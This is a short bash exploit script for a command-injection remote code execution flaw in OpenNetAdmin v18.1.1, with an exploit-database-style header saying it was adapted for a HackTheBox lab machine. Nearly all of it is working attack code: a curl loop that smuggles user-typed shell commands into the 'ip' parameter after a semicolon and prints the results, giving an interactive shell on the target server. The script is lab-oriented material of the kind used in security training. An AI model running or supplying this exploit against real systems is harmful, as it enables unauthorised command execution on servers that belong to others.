# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Modified to run on OpenAdmin box of hackthebox by ald3rs0n
# Github Link: github.com/opennetadmin_rce_18.1.1

#!/bin/bash

echo "Useage: ${0} <target URL> <your IP>"
URL="${1}"
IP="${2}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E${IP}%3b${cmd}&xajaxargs[]=ping" "${URL}/" | grep "ms" -A 100 | sed  '/^</,+10d;1,6d;/rtt/d'
done
